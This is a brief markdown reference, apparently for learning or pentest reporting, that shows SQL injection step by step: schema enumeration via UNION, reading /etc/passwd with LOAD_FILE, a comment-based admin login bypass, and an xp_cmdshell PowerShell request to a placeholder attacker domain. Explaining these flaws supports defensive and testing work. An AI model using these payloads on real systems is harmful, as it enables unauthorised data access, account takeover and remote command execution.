# SQL Injection

## Table of Contents
- [Information Leakage](#information-leakage)
- [Authentication bypass](#authentication-bypass)
- [RCE](#rce)

## Information Leakage

### It is possible to access data without the appropriate permissions.

- Retrieving schema objects
    1. Query that fetches posts
        ```sql
        SELECT * FROM posts WHERE id = {user_input};
        ```
    2. Standard query
        ```sql
        SELECT * FROM posts WHERE id = 1;
        ```
        ```json
        {
          "id": 1,
          "title": "First Post",
          "content": "This is the content of the first post."
        }
        ```
    3. Manipulated query
        ```sql
        SELECT * FROM posts WHERE id = 1 UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema = 'database_name'
        ```
        ```json
        [
          {
            "id": 1,
            "title": "First Post",
            "content": "This is the content of the first post."
          },
          {
            "id": null,
            "table_name": "posts",
            "content": null
          },
          {
            "id": null,
            "table_name": "user_information",
            "content": null
          }
        ]
        ```

- Reading file from the file system
    1. Query that fetches posts
        ```sql
        SELECT * FROM posts WHERE id = {user_input};
        ```
    2. Manipulating the query to read local files
        ```sql
        SELECT * FROM posts WHERE id = 1 UNION SELECT null, LOAD_FILE('/etc/passwd'),null;
        ```
        ```json
        [
          {
            "id": 1,
            "title": "First Post",
            "content": "This is the content of the first post."
          },
          {
            "id": null,
            "title": "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash\n...",
            "content": null
          }
        ]
        ```

## Authentication bypass

### The protection implemented in the service can be bypassed.

- Login bypass
    1. Query that validates credentials
        ```sql
        SELECT * FROM users WHERE id = '{user_input_id}' AND password = '{user_input_password}';
        ```

    2. Manipulated query
        ```sql
        SELECT * FROM users WHERE id = 'admin'-- AND password = '1';
        ```

## RCE

### Arbitrary commands can be executed remotely.

- OAST
    1. Query that fetches posts
        ```sql
        SELECT * FROM posts WHERE id = {user_input};
        ```
    2. Manipulated query
        ```sql
        SELECT * FROM posts WHERE id = 1; exec xp_cmdshell('powershell -Command "Invoke-WebRequest -Uri https://[ATTACKER-DOMAIN]/"');
        ```
